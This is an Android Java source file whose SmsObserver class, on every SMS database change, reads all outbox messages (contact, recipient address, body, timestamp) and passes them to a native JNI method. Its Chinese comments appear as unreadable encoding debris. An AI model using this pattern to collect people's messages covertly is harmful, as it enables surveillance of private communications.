package com.example.myphone;

import java.io.UnsupportedEncodingException;
import java.sql.Date;
import java.text.SimpleDateFormat;

import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;
import android.widget.Toast;

public class SmsObserver extends ContentObserver{
	private static final String TAG = "MyPhone";
	private final boolean DEBUG = true;
	public SmsObserver(Handler handler) {
		super(handler);
	} 
	@Override 
    public void onChange(boolean selfChange) { 
        //��ѯ�������еĶ��� 
        Cursor cursor= MainActivity.MainThis.getContentResolver().query(Uri.parse( 
                "content://sms/outbox"), null, null, null, null); 
        //������ѯ�����ȡ�û����ڷ��͵Ķ��� 
        while (cursor.moveToNext()) { 
            StringBuffer sb=new StringBuffer(); 
            //��ȡ���ŵ���ϵ�� 
            sb.append(
            		cursor.getString(cursor.getColumnIndex("person"))
            		+ "+"); 
            //��ȡ���ŵķ��͵�ַ 
            sb.append(
            		cursor.getString(cursor.getColumnIndex("address"))
            		+ "+"); 
            //��ȡ���ŵ����� 
            sb.append(cursor.getString(cursor.getColumnIndex("body"))
            		+ "+");  
            //��ȡ���ŵķ���ʱ�� 
            long ldate = cursor.getLong(cursor.getColumnIndex("date"));
            sb.append(ldate + "+");
            //������ʱ���ʽ������ 

            Date date=new Date(ldate);  
            //��ʽ������Ϊ��λ������  
            SimpleDateFormat sdf=new SimpleDateFormat("yyyy-MM-dd hh:mm:ss"); 
            String strdate = sdf.format(date);
            sb.append(strdate + "+");

            //��Ϣ���ͣ�SMS�����
            sb.append(cursor.getInt(cursor.getColumnIndex("protocol")));

            if(DEBUG)
            	Log.i(TAG, "���͵Ķ��ţ�"+sb.toString()); 
            
            if(MainActivity.objPhone != null)
            {
            //����JNI�㷢��
			try {
				byte[] bArry = sb.toString().getBytes("gbk");
				MainActivity.objPhone.SendNewOutSms(bArry, 
						bArry.length);
			} catch (UnsupportedEncodingException e) {
				e.printStackTrace();
			}
            }
        } 
        super.onChange(selfChange); 
    } 
}
